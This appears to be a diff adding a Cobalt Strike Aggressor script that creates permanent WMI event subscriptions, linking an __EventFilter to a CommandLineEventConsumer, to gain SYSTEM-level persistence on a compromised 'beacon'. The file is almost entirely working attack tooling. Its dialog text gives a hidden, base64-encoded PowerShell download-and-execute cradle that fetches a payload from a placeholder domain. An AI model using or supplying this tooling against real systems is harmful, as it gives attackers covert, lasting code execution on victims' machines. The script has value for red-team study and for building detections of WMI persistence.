@@ -1,0 +1,50 @@
+#Permanent WMI Event using WMIC Persistence
+#Author: @Qu1nn
+#Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon
+#Very syntax heavy, Test first before using on live targets
+
+sub persistwmieventwmic {
+	$bid = $1;
+	$dialog = dialog("Permanent WMI Event using WMIC Persistence", %(eventfilter => "__EventFilter Name..", eventquery => "Event Query...(Win32 Classes)", eventconsumer => "CommandLineEventConsumer Name..(Must be different from __EventFilter Name)", commandline => "CommandLineTemplate Syntax..(powershell.exe -w hidden -enc)", payloadfile => "Encoded Payload String.."), lambda({
+		if ("$3['eventfilter']" ismatch '__EventFilter Name..' || "$3['eventquery']" ismatch 'Event Query...(Win32 Classes)' || "$3['eventconsumer']" ismatch 'CommandLineEventConsumer Name..(Must be different from __EventFilter Name)' || "$3['commandline']" ismatch 'CommandLineTemplate Syntax..(powershell.exe -w hidden)' || "$3['payloadfile']" ismatch 'Select Encoded Payload..') {
+			berror($bid, "\c4Please enter a valid Custom __EventFilter Name, Event Query, CommandLineEventConsumer Name, Command Line Options, and the Encoded Payload File.");
+			break;
+		}
+		else {
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter CREATE Name="'.$3['eventfilter'].'", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="'.$3['eventquery'].'"');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer CREATE Name="'.$3['eventconsumer'].'", CommandLineTemplate="'.$3['commandline']." ".split("/",$3['payloadfile'])[-1].'"');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"'.$3['eventfilter'].'\"", Consumer="CommandLineEventConsumer.Name=\"'.$3['eventconsumer'].'\""');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __EventFilter GET __RELPATH /FORMAT:list');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH CommandLineEventConsumer GET __RELPATH /FORMAT:list');
+			bshell($bid, 'wmic /NAMESPACE:"\\\root\subscription" PATH __FilterToConsumerBinding GET __RELPATH /FORMAT:list');
+		}
+	}));
+	dialog_description($dialog, "Generates a Custom WMI Event using WMIC for SYSTEM Level persistence on selected beacon. **Syntax is heavy, Test before using on live targets. Encoded Payload must include IEX ((new-object new.webclient).downloadstring(http://yourdomain/payload.txt)) Utilize the following command to encode the payload correctly: cat payload.txt | iconv --to-code=UTF-16LE | base64** ");
+	
+	#base 64 encode IEX of the powershell one liner
+	#cat payload.txt | iconv --to-code=UTF-16LE | base64
+	
+	drow_text($dialog, "eventfilter",  "Custom __EventFilter Name:");
+	drow_text($dialog, "eventquery", "Custom Event Query:");
+	drow_text($dialog, "eventconsumer", "Custom CommandLineEventConsumer Name:");
+	drow_text($dialog, "commandline", "Custom Command Line Options:");
+	drow_text($dialog, "payloadfile", "Custom Encoded Payload String:");
+	
+	dbutton_action($dialog, "Create");
+	dialog_show($dialog);
+
+}
+
+popup beacon_bottom {
+	item "&Permanent WMI Event using WMIC Persistence" {
+		local('$bid');
+		foreach $bid ($1) {
+			if (-isadmin $bid) {
+				persistwmieventwmic($bid);
+			}
+			else {
+				berror($1, "\c4Persistence Requires Admin Level Privileges");
+			}
+		}
+	}
+}
